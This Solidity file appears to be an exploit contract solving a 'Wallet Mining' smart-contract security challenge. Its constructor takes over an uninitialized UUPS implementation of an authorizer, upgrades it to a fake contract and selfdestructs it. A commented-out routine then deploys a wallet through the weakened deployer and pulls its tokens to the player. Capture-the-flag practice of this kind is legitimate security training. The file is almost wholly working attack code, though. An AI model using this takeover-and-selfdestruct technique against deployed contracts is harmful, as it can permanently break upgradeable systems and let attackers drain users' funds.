// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./AuthorizerUpgradeable.sol";
import "./WalletDeployer.sol";
import "hardhat/console.sol";

contract testWalletMining {
    address authorizerUpgradeable;
    address token;
    address player;
    address walletDeployer;
    address authorizerUpgradeableImp;

    constructor(
        address _authorizerUpgradeable,
        address _player,
        address _token,
        address _walletDeployer,
        address _authorizerUpgradeableImp
    ) {
        authorizerUpgradeable = _authorizerUpgradeable;
        player = _player;
        token = _token;
        walletDeployer = _walletDeployer;
        authorizerUpgradeableImp = _authorizerUpgradeableImp;

        console.log("authorizerUpgradeableImp", authorizerUpgradeableImp);
        AuthorizerUpgradeable(authorizerUpgradeableImp).init(
            new address[](1),
            new address[](1)
        );
        fackAuthorizersImpOfImp fake = new fackAuthorizersImpOfImp();
        AuthorizerUpgradeable(authorizerUpgradeableImp).upgradeToAndCall(
            address(fake),
            abi.encodeWithSignature("destroy()")
        );
    }

    // function start() external {
    //     //can always success after imp destroy
    //     console.log(
    //         "can",
    //         WalletDeployer(walletDeployer).can(address(this), address(this))
    //     );
    //     bytes memory data = abi.encodeWithSelector(
    //         this.setup.selector,
    //         player,
    //         1,
    //         address(0),
    //         "",
    //         address(0),
    //         address(0),
    //         0,
    //         address(0)
    //     );
    //     console.log("walletDeployer", walletDeployer);
    //     console.log(
    //         "addr",
    //         WalletDeployer(walletDeployer).mom(),
    //         address(WalletDeployer(walletDeployer).fact())
    //     );
    //     console.log(
    //         "fact code length",
    //         address(WalletDeployer(walletDeployer).fact()).code.length
    //     );

    //     address aim = WalletDeployer(walletDeployer).drop(data);
    //     console.log("aim", aim);

    //     printTokenBalance(token, aim, "final aim token balance");
    //     IERC20(token).transferFrom(aim, player, IERC20(token).balanceOf(aim));
    //     // for (uint i; i < 1; i++) {
    //     //     address aim = WalletDeployer(walletDeployer).drop("");
    //     //     console.log("aim", aim);
    //     // }
    //     printTokenBalance(token, address(this), "final token balance");
    //     // IERC20(token).transfer(player, IERC20(token).balanceOf(address(this)));
    // }

    // function can(address usr, address aim) external view returns (bool) {
    //     return true;
    // }

    function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
    ) external {}

    function printTokenBalance(
        address _token,
        address addr,
        string memory msg
    ) public returns (uint256) {
        (bool suc, bytes memory bal) = _token.call(
            abi.encodeWithSignature("balanceOf(address)", addr)
        );
        require(suc, msg);
        uint256 balance = abi.decode(bal, (uint256));

        console.log(msg, balance);
        return balance;
    }

    fallback() external payable {}

    receive() external payable {}
}

contract fackAuthorizersImpOfImp is
    Initializable,
    OwnableUpgradeable,
    UUPSUpgradeable
{
    mapping(address => mapping(address => uint256)) private wards;

    function _authorizeUpgrade(address imp) internal override {}

    function destroy() public {
        selfdestruct(payable(address(0)));
    }
}
